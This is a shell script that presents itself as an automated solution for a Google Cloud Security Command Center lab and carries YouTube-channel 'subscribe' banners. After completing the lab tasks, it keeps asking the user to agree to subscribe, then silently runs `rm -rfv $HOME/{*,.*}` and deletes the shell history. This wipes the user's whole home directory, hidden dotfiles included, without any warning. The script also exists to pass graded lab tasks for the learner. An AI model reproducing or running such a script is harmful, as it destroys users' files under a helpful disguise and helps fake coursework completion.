BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`

pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

#----------------------------------------------------start--------------------------------------------------#

echo "${GREEN}${BOLD}

Starting Execution 


${RESET}"

#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')

pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

#----------------------------------------------------code--------------------------------------------------# 



# Enable the Google Cloud Security Command Center service
gcloud services enable securitycenter.googleapis.com

# Wait until the service is enabled
while true; do
  SERVICE_STATUS=$(gcloud services list --enabled | grep "securitycenter.googleapis.com")
  if [ -n "$SERVICE_STATUS" ]; then
    break
  fi
done

# Once the service is enabled, you can proceed with other commands
gcloud scc muteconfigs create muting-pga-findings \
  --project=$DEVSHELL_PROJECT_ID \
  --description="Mute rule for VPC Flow Logs" \
  --filter="category=\"FLOW_LOGS_DISABLED\""


echo "${BLUE}${BOLD}

Task 3.1 Completed

${RESET}"

gcloud compute networks create scc-lab-net --subnet-mode=auto

echo "${BLUE}${BOLD}

Task 3.2 Completed

${RESET}"

gcloud compute firewall-rules update default-allow-rdp --source-ranges=35.235.240.0/20


gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.240.0/20

echo "${BLUE}${BOLD}

Task 3.3 Completed

Lab Completed !!!

${RESET}"

pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
